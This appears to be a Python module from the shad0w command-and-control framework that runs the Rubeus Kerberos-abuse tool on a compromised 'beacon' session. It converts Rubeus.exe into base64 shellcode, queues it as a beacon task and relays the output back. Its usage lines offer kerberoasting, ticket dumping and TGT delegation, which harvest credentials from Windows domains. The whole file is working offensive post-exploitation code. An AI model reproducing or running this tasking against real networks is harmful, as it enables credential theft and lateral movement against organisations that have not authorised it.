#
# Execute rubeus on a session
#

from lib import shellcode

__description__ = "A toolset for raw Kerberos interaction and abuses"
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
from lib.basecommand import BaseCommand

USERCD_EXEC_ID = 0x3000

# location of rubeus binary
RUBEUS_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Rubeus.exe"

# beacon to exec command on
current_beacon = None

class RubeusCommand(BaseCommand):

    def __init__(self, args, beacon):
        BaseCommand.__init__(self, "rubeus", args)

        self.beacon = beacon

    def parse_parameters(self):
        self.parser.add_argument("-x", "--execute", nargs='+', required=True, help="Rubeus command to execute")

    def get_usage(self):
        return """
rubeus -x kerberoast
rubeus -x klist
rubeus -x dump
rubeus -x tgtdeleg
rubeus -x help
"""

    def run(self, shad0w):
        if self.args.execute:
            params = ' '.join(self.args.execute)

            # kinda a hack to make sure we intergrate nice with the shellcode generator
            self.args.param = self.args.execute
            self.args.cls = False
            self.args.method = False
            self.args.runtime = False
            self.args.appdomain = False

            b64_comp_data = shellcode.generate(RUBEUS_BIN, self.args, params)

        # dont clear the callbacks, cause the responses are chunked
        shad0w.clear_callbacks = False

        shad0w.beacons[self.beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
        shad0w.beacons[self.beacon]["callback"] = rubeus_callback


def rubeus_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""


def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    cmd = RubeusCommand(args, beacon)
    if cmd.parse() is True:
        cmd.run(shad0w)

    return
